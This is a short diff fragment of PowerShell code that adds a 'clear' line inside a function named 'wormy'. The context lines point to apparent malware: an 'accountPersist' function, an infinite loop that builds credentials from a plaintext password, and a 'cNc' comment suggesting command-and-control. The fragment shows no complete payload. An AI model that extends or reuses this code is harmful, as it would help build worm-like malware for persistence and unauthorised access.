@@ -91,6 +91,7 @@ function accountPersist{
 function wormy{
     
     while(1 -eq 1){
+        clear
         [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
         [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
         #cNc
